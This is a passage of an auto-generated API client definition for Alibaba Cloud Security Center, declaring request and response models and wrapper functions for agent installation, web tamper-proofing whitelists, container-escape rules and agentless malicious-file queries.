  clusterName?: string(name='ClusterName', description='The cluster name.', example='proxy-test'),
  installCode?: string(name='InstallCode', description='The installation code.', example='Z9c8SA'),
  yundunUuids?: [ string ](name='YundunUuids', description='The UUIDs of the proxy servers.'),
}

model InstallHybridProxyResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='E55BE5DB-E2DF-57EB-A0C5-7A85EEA67A4C'),
}

model InstallHybridProxyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: InstallHybridProxyResponseBody(name='body'),
}

/**
 * @summary Installs the Security Center agent on a proxy server in a hybrid cloud.
 *
 * @param request InstallHybridProxyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return InstallHybridProxyResponse
 */
async function installHybridProxyWithOptions(request: InstallHybridProxyRequest, runtime: Util.RuntimeOptions): InstallHybridProxyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.installCode)) {
    query['InstallCode'] = request.installCode;
  }
  if (!Util.isUnset(request.yundunUuids)) {
    query['YundunUuids'] = request.yundunUuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallHybridProxy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Installs the Security Center agent on a proxy server in a hybrid cloud.
 *
 * @param request InstallHybridProxyRequest
 * @return InstallHybridProxyResponse
 */
async function installHybridProxy(request: InstallHybridProxyRequest): InstallHybridProxyResponse {
  var runtime = new Util.RuntimeOptions{};
  return installHybridProxyWithOptions(request, runtime);
}

model InstallPmAgentRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='58.35.xx.xx'),
  type?: string(name='Type', description='The type of the client.

*   **aliyun_assist**: Cloud Assistant client
*   **aliyun_monitor**: CloudMonitor client

This parameter is required.', example='aliyun_monitor'),
  uuids?: string(name='Uuids', description='The UUID of the server. If you specify multiple UUIDs, separate the UUIDs with commas (,).

This parameter is required.', example='inet-a6444920-d303-4ccf-ab87-a1d3cd49****'),
}

model InstallPmAgentResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D49B5134-9511-5736-B447-BEE0AC66****'),
}

model InstallPmAgentResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: InstallPmAgentResponseBody(name='body'),
}

/**
 * @summary Installs the CloudMonitor agent on a server that is not deployed on Alibaba Cloud.
 *
 * @param request InstallPmAgentRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return InstallPmAgentResponse
 */
async function installPmAgentWithOptions(request: InstallPmAgentRequest, runtime: Util.RuntimeOptions): InstallPmAgentResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallPmAgent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Installs the CloudMonitor agent on a server that is not deployed on Alibaba Cloud.
 *
 * @param request InstallPmAgentRequest
 * @return InstallPmAgentResponse
 */
async function installPmAgent(request: InstallPmAgentRequest): InstallPmAgentResponse {
  var runtime = new Util.RuntimeOptions{};
  return installPmAgentWithOptions(request, runtime);
}

model InstallUniBackupAgentRequest {
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.

This parameter is required.', example='123'),
}

model InstallUniBackupAgentResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='53ACA55D-0325-5056-A72D-D0EC0B9C****'),
}

model InstallUniBackupAgentResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: InstallUniBackupAgentResponseBody(name='body'),
}

/**
 * @summary Installs the anti-ransomware agent for databases.
 *
 * @param request InstallUniBackupAgentRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return InstallUniBackupAgentResponse
 */
async function installUniBackupAgentWithOptions(request: InstallUniBackupAgentRequest, runtime: Util.RuntimeOptions): InstallUniBackupAgentResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallUniBackupAgent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Installs the anti-ransomware agent for databases.
 *
 * @param request InstallUniBackupAgentRequest
 * @return InstallUniBackupAgentResponse
 */
async function installUniBackupAgent(request: InstallUniBackupAgentRequest): InstallUniBackupAgentResponse {
  var runtime = new Util.RuntimeOptions{};
  return installUniBackupAgentWithOptions(request, runtime);
}

model JoinWebLockProcessWhiteListRequest {
  processPaths?: [ string ](name='ProcessPaths', description='The paths of the processes.'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers on which the processes run. Separate multiple UUIDs with commas (,).', example='0c1714dc-f7a3-4265-8364-7aa3fce8****,1cc45e7d-7698-4b2c-89d8-e8cba407****'),
}

model JoinWebLockProcessWhiteListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A47D621A-193E-5BDA-ADFA-A0D3133E199C'),
}

model JoinWebLockProcessWhiteListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: JoinWebLockProcessWhiteListResponseBody(name='body'),
}

/**
 * @summary Adds processes to the process whitelist of web tamper proofing.
 *
 * @param request JoinWebLockProcessWhiteListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return JoinWebLockProcessWhiteListResponse
 */
async function joinWebLockProcessWhiteListWithOptions(request: JoinWebLockProcessWhiteListRequest, runtime: Util.RuntimeOptions): JoinWebLockProcessWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.processPaths)) {
    query['ProcessPaths'] = request.processPaths;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'JoinWebLockProcessWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds processes to the process whitelist of web tamper proofing.
 *
 * @param request JoinWebLockProcessWhiteListRequest
 * @return JoinWebLockProcessWhiteListResponse
 */
async function joinWebLockProcessWhiteList(request: JoinWebLockProcessWhiteListRequest): JoinWebLockProcessWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return joinWebLockProcessWhiteListWithOptions(request, runtime);
}

model ListAccountsInResourceDirectoryResponseBody = {
  accounts?: [ 
    {
      accountId?: string(name='AccountId', description='The Alibaba Cloud account ID of the member.', example='180803538814****'),
      displayName?: string(name='DisplayName', description='The name of the member.', example='abc**'),
      folderId?: string(name='FolderId', description='The ID of the folder in the resource directory.', example='fd-cE2SQP****'),
      isMaAccount?: string(name='IsMaAccount', description='Indicates whether the member is an administrator account of the resource directory. Valid values:

*   **yes**
*   **no**', example='no'),
      isMarked?: string(name='IsMarked', description='Indicates whether the member is marked as followed.', example='no'),
      isSasDaAccount?: string(name='IsSasDaAccount', description='Indicates whether the member is a delegated administrator account of Security Center. Valid values:

*   **yes**
*   **no**', example='no'),
      isSiemControlAccount?: string(name='IsSiemControlAccount', description='Indicates whether the member is an account of the threat analysis and response feature. Valid values:

*   **yes**
*   **no**', example='no'),
      isSiemDaAccount?: string(name='IsSiemDaAccount', description='Indicates whether the member is a delegated administrator account of the threat analysis and response feature. Valid values:

*   **yes**
*   **no**', example='no'),
      sasVersion?: string(name='SasVersion', description='The edition of Security Center that you use. Valid value:

*   **0** or **1**: Basic
*   **2** or **3**: Enterprise
*   **5**: Advanced
*   **6**: Anti-virus
*   **7**: Ultimate', example='0'),
    }
  ](name='Accounts', description='The members in the resource directory.'),
  requestId?: string(name='RequestId', description='The request ID.', example='B7A839E8-70AE-591D-8D9E-C5419A2240DB'),
}

model ListAccountsInResourceDirectoryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAccountsInResourceDirectoryResponseBody(name='body'),
}

/**
 * @summary Queries members in the resource directory that is involved when the multi-account management feature is enabled.
 *
 * @description You must use the management account of your resource directory or a delegated administrator account of Security Center to call this operation.
 *
 * @param request ListAccountsInResourceDirectoryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAccountsInResourceDirectoryResponse
 */
async function listAccountsInResourceDirectoryWithOptions(runtime: Util.RuntimeOptions): ListAccountsInResourceDirectoryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListAccountsInResourceDirectory',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries members in the resource directory that is involved when the multi-account management feature is enabled.
 *
 * @description You must use the management account of your resource directory or a delegated administrator account of Security Center to call this operation.
 *
 * @return ListAccountsInResourceDirectoryResponse
 */
async function listAccountsInResourceDirectory(): ListAccountsInResourceDirectoryResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAccountsInResourceDirectoryWithOptions(runtime);
}

model ListAegisContainerPluginRuleRequest {
  criteria?: string(name='Criteria', description='The query condition.', example='[{\\\\"name\\\\": \\\\"name\\\\", \\\\"value\\\\": \\\\"test-1818\\\\"}]'),
  currentPage?: int32(name='CurrentPage', description='The page number.

This parameter is required.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.

This parameter is required.', example='20'),
  ruleType?: int32(name='RuleType', description='The type of the rule. Valid values:

*   **0**: custom
*   **1**: system', example='0'),
}

model ListAegisContainerPluginRuleResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  ruleList?: [ 
    {
      gmtCreate?: long(name='GmtCreate', description='The time when the rule was created. Unit: milliseconds.', example='1676355025000'),
      gmtModified?: long(name='GmtModified', description='The time when the rule was modified. Unit: milliseconds.', example='1681985833000'),
      mode?: int32(name='Mode', description='The action of the rule. Valid values:

*   **1**: Alert
*   **2**: Block', example='1'),
      policies?: [ 
        {
          policyKey?: string(name='PolicyKey', description='The policy key.', example='system_auto_****'),
          policyName?: string(name='PolicyName', description='The name of the policy.', example='System self-starting task\\\\*\\\\*\\\\*\\\\*'),
        }
      ](name='Policies', description='An array that consists of policies.'),
      ruleDescription?: string(name='RuleDescription', description='The description of the rule.', example='system_call'),
      ruleId?: long(name='RuleId', description='The ID of the rule.', example='30****'),
      ruleName?: string(name='RuleName', description='The name of the rule.', example='test-18****'),
      ruleTemplateId?: string(name='RuleTemplateId', description='The ID of the rule template. The ListSystemClientRules operation returns the ID of a rule template.', example='868**'),
      ruleTemplateName?: string(name='RuleTemplateName', description='The name of the rule template.', example='system_call'),
      selectedPolicy?: [ string ](name='SelectedPolicy', description='The fields in the value of the rule subtype.'),
      switchId?: string(name='SwitchId', description='The switch ID of the rule.', example='USER-ENABLE-SWITCH-TYPE_****'),
      whiteImages?: [ string ](name='WhiteImages', description='The images that are added to the whitelist of the rule.'),
    }
  ](name='RuleList', description='The rules.'),
}

model ListAegisContainerPluginRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAegisContainerPluginRuleResponseBody(name='body'),
}

/**
 * @summary Queries defense rules against container escapes.
 *
 * @param request ListAegisContainerPluginRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAegisContainerPluginRuleResponse
 */
async function listAegisContainerPluginRuleWithOptions(request: ListAegisContainerPluginRuleRequest, runtime: Util.RuntimeOptions): ListAegisContainerPluginRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.ruleType)) {
    query['RuleType'] = request.ruleType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAegisContainerPluginRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries defense rules against container escapes.
 *
 * @param request ListAegisContainerPluginRuleRequest
 * @return ListAegisContainerPluginRuleResponse
 */
async function listAegisContainerPluginRule(request: ListAegisContainerPluginRuleRequest): ListAegisContainerPluginRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAegisContainerPluginRuleWithOptions(request, runtime);
}

model ListAgentlessAssetRequest {
  currentPage?: int32(name='CurrentPage', description='The page number in a paginated query.', example='1'),
  diskType?: string(name='DiskType', description='The type of the cloud disk. Values:

- **system**: System disk

- **data**: Data disk', example='data'),
  instanceId?: string(name='InstanceId', description='The ID of the asset instance.', example='s-bp1g6wxdwps7s9dz****'),
  instanceName?: string(name='InstanceName', description='The name of the asset instance.', example='ca_cpm_******'),
  pageSize?: int32(name='PageSize', description='The maximum number of items to return per page in a paginated query.', example='10'),
  platform?: string(name='Platform', description='The type of the operating system.', example='CentOS'),
  scanRegionId?: string(name='ScanRegionId', description='The region ID.', example='cn-beijing'),
  targetType?: int32(name='TargetType', description='The type of the detection target. Values:

- **3**: User snapshot

- **4**: User-defined image', example='1'),
}

model ListAgentlessAssetResponseBody = {
  assetList?: [ 
    {
      diskType?: string(name='DiskType', description='The type of the cloud disk. Values:

- system: System disk.

- data: Data disk.', example='system'),
      instanceId?: string(name='InstanceId', description='The instance ID.', example='s-rj9gda4wolo0zixi****'),
      instanceName?: string(name='InstanceName', description='The instance name.', example='TestInstanceName'),
      platform?: string(name='Platform', description='Operating system type.', example='CentOS'),
      regionId?: string(name='RegionId', description='The region ID.', example='cn-hangzhou'),
      targetType?: int32(name='TargetType', description='The type of the asset. Values:

- **3**: User snapshot

- **4**: User-defined image', example='3'),
    }
  ](name='AssetList', description='The list of returned assets.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The current page number in a paginated query.', example='1'),
    pageSize?: int32(name='PageSize', description='The maximum number of items to display per page in a paginated query.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of items.', example='90'),
  }(name='PageInfo', description='Pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is a unique identifier generated by Alibaba Cloud for this request and can be used for troubleshooting and problem localization.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model ListAgentlessAssetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAgentlessAssetResponseBody(name='body'),
}

/**
 * @summary Query agentless detection assets.
 *
 * @param request ListAgentlessAssetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAgentlessAssetResponse
 */
async function listAgentlessAssetWithOptions(request: ListAgentlessAssetRequest, runtime: Util.RuntimeOptions): ListAgentlessAssetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.diskType)) {
    query['DiskType'] = request.diskType;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.platform)) {
    query['Platform'] = request.platform;
  }
  if (!Util.isUnset(request.scanRegionId)) {
    query['ScanRegionId'] = request.scanRegionId;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAgentlessAsset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query agentless detection assets.
 *
 * @param request ListAgentlessAssetRequest
 * @return ListAgentlessAssetResponse
 */
async function listAgentlessAsset(request: ListAgentlessAssetRequest): ListAgentlessAssetResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAgentlessAssetWithOptions(request, runtime);
}

model ListAgentlessMaliciousFilesRequest {
  currentPage?: int32(name='CurrentPage', description='The page number.

This parameter is required.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is handled. Valid values:

*   Y: The vulnerability is handled.
*   N: The vulnerability is not handled.', example='Y'),
  eventId?: long(name='EventId', description='The event ID.', example='81****'),
  fuzzyMaliciousName?: string(name='FuzzyMaliciousName', description='The name of the malicious file that you want to query.

> Fuzzy match is supported.', example='WebShell'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  levels?: string(name='Levels', description='The severities of the malicious files. Separate multiple values with commas (,). Valid values:

*   serious
*   suspicious
*   remind', example='remind,suspicious'),
  maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious file.', example='d836968041f7683b5459****'),
  maliciousType?: string(name='MaliciousType', description='The alert type.

Valid values when Lang is set to zh:

*   WebShell
*   Malicious Software
*   Malicious Script

Valid values when Lang is set to en:

*   WebShell
*   Malicious Software
*   Malicious Script', example='WebShell'),
  pageSize?: string(name='PageSize', description='The number of entries per page.

This parameter is required.', example='20'),
  remark?: string(name='Remark', description='The remarks for the asset affected by the vulnerability. The value can be the private IP address, public IP address, or name of the asset. Fuzzy match is supported.', example='192.168.XX.XX'),
  scanRange?: [ string ](name='ScanRange', description='The source of the malicious file.'),
  uuid?: string(name='Uuid', description='The UUID of the asset.', example='d2d94e8b-bb25-4744-8004-1e08a53c****'),
}

model ListAgentlessMaliciousFilesResponseBody = {
  list?: [ 
    {
      details?: [ 
        {
          name?: string(name='Name', description='The name of the detailed item.', example='MD5'),
          nameKey?: string(name='NameKey', description='The name key of the detailed item.', example='${suspicious.mp.db.maliciousfilemd5}'),
          type?: string(name='Type', description='The type of the detailed item.', example='text'),
          value?: string(name='Value', description='The value of the detailed item.', example='1'),
        }
      ](name='Details', description='The details of the alert event.'),
      downloadUrl?: string(name='DownloadUrl', description='The URL to download the malicious image sample.', example='https://upgrade-rule-pkg.oss-cn-beijing.aliyuncs.com/totalpackage/rule/V3.166.2/totalpackage_rule_V3.16_6.2_tip_20230220110****'),
      filePath?: long(name='FilePath', description='The file path.', example='/root/etc/g****'),
      firstScanTimestamp?: long(name='FirstScanTimestamp', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='168257753****'),
      highLight?: string(name='HighLight', description='The highlighted JSON string.', example='{\\\\"highlight\\\\":{\\\\"ruleVersion\\\\":\\\\"20230223\\\\",\\\\"ruleId\\\\":600139,\\\\"events\\\\":[[207,284]]}}'),
      id?: long(name='Id', description='The event ID.', example='1****'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='sql-test-001****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      latestScanTimestamp?: long(name='LatestScanTimestamp', description='The timestamp generated when the last scan was performed. Unit: milliseconds.', example='168257753****'),
      level?: string(name='Level', description='The severity of the malicious file. Valid values:

*   serious
*   suspicious
*   remind', example='serious'),
      maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious file.', example='1f2e13a7c51ee89316ae50066515****'),
      maliciousName?: string(name='MaliciousName', description='The name of the malicious file.', example='WebShell'),
      maliciousType?: string(name='MaliciousType', description='The type of the virus.', example='WebShell'),
      notes?: [ 
        {
          note?: string(name='Note', description='The remark.', example='Serious***'),
          noteId?: string(name='NoteId', description='The ID of the remark.', example='50****'),
          noteTime?: string(name='NoteTime', description='The time when the remark was created.', example='2023-04-27 14:49:21'),
        }
      ](name='Notes', description='The remarks.'),
      operateResult?: string(name='OperateResult', description='The handling result of the alert.', example='addWhitelist.USER.Success'),
      operateTimestamp?: string(name='OperateTimestamp', description='The timestamp generated when the alert is handled. Unit: milliseconds.', example='168257753****'),
      partition?: string(name='Partition', description='The partition of the disk.', example='/dev/xvda1'),
      targetId?: string(name='TargetId', description='The ID of the asset that is scanned.', example='m-****'),
      targetName?: string(name='TargetName', description='The name of the asset that is scanned.', example='jenkins****'),
      targetType?: string(name='TargetType', description='The type of the asset that is scanned. Valid values:

*   2: The scanned asset is an image.', example='2'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='The malicious files.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='23'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='CE343162-35BF-565E-B85E-8E3B7A2B****'),
}

model ListAgentlessMaliciousFilesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAgentlessMaliciousFilesResponseBody(name='body'),
}

/**
 * @summary Queries malicious files that are detected by agentless detection tasks.
 *
 * @param request ListAgentlessMaliciousFilesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAgentlessMaliciousFilesResponse
 */
async function listAgentlessMaliciousFilesWithOptions(request: ListAgentlessMaliciousFilesRequest, runtime: Util.RuntimeOptions): ListAgentlessMaliciousFilesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.eventId)) {
    query['EventId'] = request.eventId;
  }
  if (!Util.isUnset(request.fuzzyMaliciousName)) {
    query['FuzzyMaliciousName'] = request.fuzzyMaliciousName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.maliciousMd5)) {
    query['MaliciousMd5'] = request.maliciousMd5;
  }
  if (!Util.isUnset(request.maliciousType)) {
    query['MaliciousType'] = request.maliciousType;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAgentlessMaliciousFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries malicious files that are detected by agentless detection tasks.
 *
 * @param request ListAgentlessMaliciousFilesRequest
 * @return ListAgentlessMaliciousFilesResponse
 */
async function listAgentlessMaliciousFiles(request: ListAgentlessMaliciousFilesRequest): ListAgentlessMaliciousFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAgentlessMaliciousFilesWithOptions(request, runtime);
}

model ListAgentlessRegionResponseBody = {
  regionList?: [ string ](name='RegionList', description='The information about the regions.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7E0618A9-D5EF-4220-9471-C42B5E92****'),
}

model ListAgentlessRegionResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListAgentlessRegionResponseBody(name='body'),
}

/**
 * @summary Queries the regions that are supported by the agentless detection feature.
 *
 * @param request ListAgentlessRegionRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListAgentlessRegionResponse
 */
async function listAgentlessRegionWithOptions(runtime: Util.RuntimeOptions): ListAgentlessRegionResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListAgentlessRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the regions that are supported by the agentless detection feature.
 *
 * @return ListAgentlessRegionResponse
 */
async function listAgentlessRegion(): ListAgentlessRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAgentlessRegionWithOptions(runtime);
}

model ListAgentlessRelateMaliciousRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.

This parameter is required.', example='1'),
  eventId?: long(name='EventId', description='The ID of the event.', example='80****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page.

This parameter is required.', example='20'),
  scenario?: string(name='Scenario', description='The scenarios of batch handling. Valid values:

*   same_file_md5: the same MD5 hash value.
*   default: the same alert type. This is the default value.', example='default'),
}

model ListAgentlessRelateMaliciousResponseBody = {
  list?: [ 
    {
      details?: [ 
        {
          name?: string(name='Name', description='The name of the detailed item.', example='MD5'),
          nameKey?: string(name='NameKey', description='The name key of the detailed item.', example='${suspicious.mp.db.maliciousfilemd5}'),
          type?: string(name='Type', description='The type of the detailed item.', example='text'),
          value?: string(name='Value', description='The value of the detailed item.', example='1f2e13a7c51ee89316ae50066515****'),
        }
      ](name='Details', description='The details of the alert events.'),
      downloadUrl?: string(name='DownloadUrl', description='The URL to download the malicious image sample.', example='https://upgrade-rule-pkg.oss-cn-beijing.aliyuncs.com/totalpackage/***'),
      filePath?: string(name='FilePath', description='The file path.', example='/root/logs/arms/tracelogs/log****'),
      firstScanTimestamp?: long(name='FirstScanTimestamp', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='168257753****'),
      highLight?: string(name='HighLight', description='The highlighted JSON string.', example='{\\\\"highlight\\\\":{\\\\"ruleVersion\\\\":\\\\"20230223\\\\",\\\\"ruleId\\\\":600139,\\\\"events\\\\":[[207,284]]}}'),
